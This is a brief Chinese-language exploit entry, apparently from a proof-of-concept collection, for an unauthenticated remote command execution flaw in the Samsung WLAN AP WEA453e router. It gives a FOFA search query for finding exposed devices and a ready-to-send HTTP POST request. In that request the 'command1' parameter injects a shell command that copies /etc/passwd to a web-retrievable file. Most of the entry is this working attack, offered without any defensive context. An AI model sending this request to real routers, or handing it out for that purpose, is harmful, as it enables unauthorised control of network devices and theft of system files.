### 描述
WLAN AP WEA453e路由器  存在远程命令执行漏洞，可在未授权的情况下执行任意命令获取服务器权限
fofa title=="Samsung WLAN AP"
### POC & EXP
```
# 请求包
POST /(download)/tmp/a.txt HTTP/1.1
Host: xxx.xxx.xxx.xxx
Connection: close
Content-Length: 0

command1=shell:cat /etc/passwd| dd of=/tmp/a.txt

```
![313213.png](https://i.loli.net/2021/04/25/WYlftLDpv3ThyE4.png)
